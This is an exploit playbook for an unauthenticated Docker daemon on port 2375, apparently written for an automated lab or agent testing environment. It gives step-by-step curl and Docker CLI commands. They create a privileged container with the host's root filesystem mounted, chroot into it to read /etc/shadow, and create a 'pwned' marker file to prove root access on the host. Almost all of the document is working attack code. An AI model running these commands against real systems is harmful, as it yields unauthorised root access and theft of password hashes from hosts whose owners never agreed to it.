# Docker API Exploit Playbook

**CVE**: N/A (Docker daemon exposed without authentication)
**Target**: http://localhost:2375
**Vulnerability**: Unauthenticated Docker API allows container creation and host filesystem access
**Authentication**: None required

## Detection

Check if the Docker API is accessible:

```bash
curl -s 'http://localhost:2375/version' | head -5
```

Expected: JSON response with `ApiVersion` field.

## RCE Payload — Privileged Container with Host Mount

### Step 1: Create a privileged container with host root mounted

```bash
curl -X POST -H 'Content-Type: application/json' \
  'http://localhost:2375/containers/create?name=exploit' \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "tail -f /dev/null"],
    "Binds": ["/:/mnt:rbind"],
    "Privileged": true
  }'
```

### Step 2: Start the container

```bash
curl -X POST 'http://localhost:2375/containers/exploit/start'
```

### Step 3: Execute commands and capture output

```bash
# Create exec instance
EXEC_ID=$(curl -s -X POST -H 'Content-Type: application/json' \
  'http://localhost:2375/containers/exploit/exec' \
  -d '{
    "AttachStdout": true,
    "AttachStderr": true,
    "Cmd": ["chroot", "/mnt", "cat", "/etc/shadow"]
  }' | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

# Start exec and get output
curl -s -X POST -H 'Content-Type: application/json' \
  "http://localhost:2375/exec/${EXEC_ID}/start" \
  -d '{}'
```

### Alternative: One-liner with Docker CLI

```bash
docker -H tcp://localhost:2375 run --rm --privileged -v /:/mnt alpine chroot /mnt id
```

## Exploit Mechanism

| Step | Action | Detail |
|------|--------|--------|
| 1 | POST /containers/create | Creates container with `Privileged: true` |
| 2 | Binds `/:/mnt` | Mounts host root filesystem at `/mnt` |
| 3 | POST /containers/exploit/start | Starts the container |
| 4 | POST /containers/exploit/exec | Executes command inside container |
| 5 | `chroot /mnt <cmd>` | Runs command from host root context |

## Validation (3-Layer)

```bash
# L1 — Host filesystem presence (can read /etc/shadow)
EXEC_ID=$(curl -s -X POST -H 'Content-Type: application/json' \
  'http://localhost:2375/containers/exploit/exec' \
  -d '{"AttachStdout":true,"Cmd":["chroot","/mnt","test","-f","/tmp/agent_is_present"]}' | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
curl -s -X POST "http://localhost:2375/exec/${EXEC_ID}/start" -d '{}'

# L2 — Host network interface detection
EXEC_ID=$(curl -s -X POST -H 'Content-Type: application/json' \
  'http://localhost:2375/containers/exploit/exec' \
  -d '{"AttachStdout":true,"Cmd":["chroot","/mnt","ip","a"]}' | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
curl -s -X POST "http://localhost:2375/exec/${EXEC_ID}/start" -d '{}'

# L3 — Host artifact creation
EXEC_ID=$(curl -s -X POST -H 'Content-Type: application/json' \
  'http://localhost:2375/containers/exploit/exec' \
  -d '{"AttachStdout":true,"Cmd":["chroot","/mnt","touch","/tmp/pwned_$(date +%s_%N)"]}' | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
curl -s -X POST "http://localhost:2375/exec/${EXEC_ID}/start" -d '{}'
```

## Notes

- Docker-in-Docker setup with daemon listening on TCP 2375
- The `alpine` image must be pulled first (or use `docker pull alpine` on the host)
- This target grants **root on the host** (not just the container)
- Container runs in privileged mode with full host filesystem access
